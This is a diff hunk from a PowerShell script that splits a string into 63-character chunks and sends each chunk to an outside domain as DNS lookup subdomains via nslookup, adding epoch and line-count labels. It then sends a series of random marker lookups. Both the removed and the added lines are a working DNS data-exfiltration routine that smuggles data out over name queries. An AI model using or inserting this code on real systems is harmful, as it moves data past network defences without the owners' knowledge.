@@ -16,7 +16,6 @@ $linenum=0
 $bstring -split '(.{63})' |? {$_;} | % { $linenum++ }
 $linetotal=$linenum
 $linenum=0
-$bstring -split '(.{63})' |? {$_;} | % { $linenum++; if ((!$retryline) -or ($linenum -eq $retryline)) { $lookup="${_}.${epoch}.${linenum}.x.${domain}"; write-host "line ${linenum}/${linetotal}  $lookup" ; nslookup $lookup >$null 2>$null ; sleep 0.1 } }
-for ($i=0; $i -lt 20; $i++) { $rand=get-random -maximum 99999 -minimum 0; $lookup="${rand}hacfhacf.x.${domain}"; write-host $lookup ; nslookup $lookup >$null 2>$null; sleep 0.6}
+$bstring -split '(.{63})' |? {$_;} | % { $linenum++; if ((!$retryline) -or ($linenum -eq $retryline)) { $lookup="${_}.${epoch}.NONE.${linenum}.${linetotal}.e2d.${domain}"; write-host "line ${linenum}/${linetotal}  $lookup" ; nslookup $lookup >$null 2>$null ; sleep 0.1 } }
+for ($i=0; $i -lt 20; $i++) { $rand=get-random -maximum 99999 -minimum 0; $lookup="${rand}hacfhacf.e2d.${domain}"; write-host $lookup ; nslookup $lookup >$null 2>$null; sleep 0.6}
 }
-
